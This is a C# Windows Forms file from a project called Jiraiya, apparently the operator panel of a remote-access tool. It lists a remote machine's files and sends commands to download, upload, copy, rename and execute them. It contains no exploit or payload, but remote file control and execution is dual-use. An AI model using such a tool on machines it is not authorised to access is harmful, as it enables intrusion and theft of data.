using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using Jiraiya.tcp;
using Jiraiya.commands;
using Jiraiya.Utils;
using System.IO;
namespace Jiraiya.Forms
{
    public partial class frmControl : Form
    {
        Client client;
        public string currentPath="0" ;
        public List<string> clipboard = new List<string>();
        public frmControl(Client cl)
        {
            client = cl;
            InitializeComponent();
            client.Send(new GetDirectory("0"));
        }

        private void frmControl_Close(object sender, EventArgs e)
        {
            client.frmControl = null;
        }

        private void files_ListView_DoubleClick(object sender, EventArgs e)
        {
            if (this.files_ListView.SelectedItems.Count == 1 )
            {
                if (Utils.Helpers.isFolder(((aFile)files_ListView.SelectedItems[0].Tag).fn))
                {
                    currentPath = ((aFile)files_ListView.SelectedItems[0].Tag).fn;
                    txtDirPath.Text = currentPath;
                    client.Send(new GetDirectory(currentPath));
                    this.fmLoadPic.Image = fmLoadPic.ErrorImage;
                }

            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            client.Send(new GetDirectory(currentPath));
        }

        private void button1_Click(object sender, EventArgs e)
        {
            currentPath = Utils.Helpers.getUpperPath(currentPath);
            txtDirPath.Text = currentPath =="0" ? "home": currentPath;
            client.Send(new GetDirectory(currentPath));
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string fname;
            for (int i = 0; i < this.files_ListView.SelectedItems.Count; i++)
            {
                if (!Utils.Helpers.isFolder(((aFile)files_ListView.SelectedItems[i].Tag).fn)) {
                    fname = currentPath + "\\" + ((aFile)files_ListView.SelectedItems[i].Tag).fn;
                    //check if i'm not already downloading this file
                    try { 
                    if (Utils.Helpers.fileInList(client.rec_files, fname) == -1)
                    {
                                               
                        if (Utils.Helpers.downWindowIndex(client.downForms, fname) == -1)
                        {
                            frmDownload f = new frmDownload(fname, client);
                            client.downForms.Add(f);
                            f.Show();
                        }
                        client.Send(new GetFile(fname));
                    }
                    else
                    {
                        MessageBox.Show("File is already being downloaded");
                    }
                        }
                    catch (Exception) { }
                    
                }
               
            }
        }

        private void contextMenuStripDirectory_Opening(object sender, CancelEventArgs e)
        {
            for (int i = 0; i < contextMenuStripDirectory.Items.Count; i++)
            {
                contextMenuStripDirectory.Items[i].Enabled = true;
            }
            if (files_ListView.SelectedItems.Count == 0)
            {
                contextMenuStripDirectory.Items[0].Enabled = false;
                contextMenuStripDirectory.Items[2].Enabled = false;
                contextMenuStripDirectory.Items[3].Enabled = false;
                contextMenuStripDirectory.Items[5].Enabled = false;
                contextMenuStripDirectory.Items[6].Enabled = false;
                contextMenuStripDirectory.Items[7].Enabled = false;
                contextMenuStripDirectory.Items[8].Enabled = false;
            }
            if (files_ListView.SelectedItems.Count >0)
            {
                contextMenuStripDirectory.Items[1].Enabled = false;
            }
            if (files_ListView.SelectedItems.Count > 1)
            {
                contextMenuStripDirectory.Items[7].Enabled = false;
            }

            if (clipboard.Count==0)
            {
                contextMenuStripDirectory.Items[4].Enabled = false;
            }
            if (currentPath == "0")
            {
                contextMenuStripDirectory.Items[1].Enabled = false;
            }
            //disable actions for folders
            for (int i = 0; i < files_ListView.SelectedItems.Count;i++ )
            {
                if (Utils.Helpers.isFolder(((aFile)files_ListView.SelectedItems[i].Tag).fn))
                {
                    contextMenuStripDirectory.Items[0].Enabled = false;
                    contextMenuStripDirectory.Items[2].Enabled = false;
                    contextMenuStripDirectory.Items[3].Enabled = false;
                    contextMenuStripDirectory.Items[5].Enabled = false;
                    contextMenuStripDirectory.Items[6].Enabled = false;
             //       contextMenuStripDirectory.Items[7].Enabled = false;
                    contextMenuStripDirectory.Items[8].Enabled = false;
                    break;
                }
            }
            //disable actions for drives
            for (int i = 0; i < files_ListView.SelectedItems.Count; i++)
            {
                if ( files_ListView.SelectedItems[i].Text.Contains(":") )
                {
                    for (int j = 0; j < contextMenuStripDirectory.Items.Count; j++)
                    {
                        contextMenuStripDirectory.Items[j].Enabled = false;
                    }
                }
            }

        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            openFileDialog1.ShowDialog();
            if (openFileDialog1.FileName != "")
            {
                string of = openFileDialog1.FileName;
                if (!File.Exists(of)) return;

                    if (Utils.Helpers.UPWindowIndex(client.UpExForms, of) == -1)
                    {
                        frmUploads f = new frmUploads(of, client,currentPath);
                        client.UpExForms.Add(f);
                        f.Show();
                    }
                    else
                    {
                        MessageBox.Show("File is already being Uploaded");
                    }
                
               

            }
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            clipboard.Clear();
            clipboard.Add("+");
            for (int i = 0; i < files_ListView.SelectedItems.Count; i++)
            {
                clipboard.Add(currentPath + "\\" + ((aFile)files_ListView.SelectedItems[i].Tag).n);
            }

        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            clipboard.Clear();
            clipboard.Add("-");
            for (int i = 0; i < files_ListView.SelectedItems.Count; i++)
            {
                clipboard.Add(currentPath + "\\" + ((aFile)files_ListView.SelectedItems[i].Tag).fn);
            }
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            if(clipboard.Count>1) client.Send(new DoCopyCut(clipboard,currentPath));
        }

        private void renameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            frmRename f;
            if(((aFile)files_ListView.SelectedItems[0].Tag).t=="folder"){
             f = new frmRename(client, ((aFile)files_ListView.SelectedItems[0].Tag).fn);
            
            }
            else { 
             f = new frmRename(client, currentPath + "\\" + ((aFile)files_ListView.SelectedItems[0].Tag).fn);
            }
            f.Show();
                
        }

        private void executeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            client.Send(new DoExecute(currentPath + "\\" + ((aFile)files_ListView.SelectedItems[0].Tag).fn));
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

      

      
    }
}
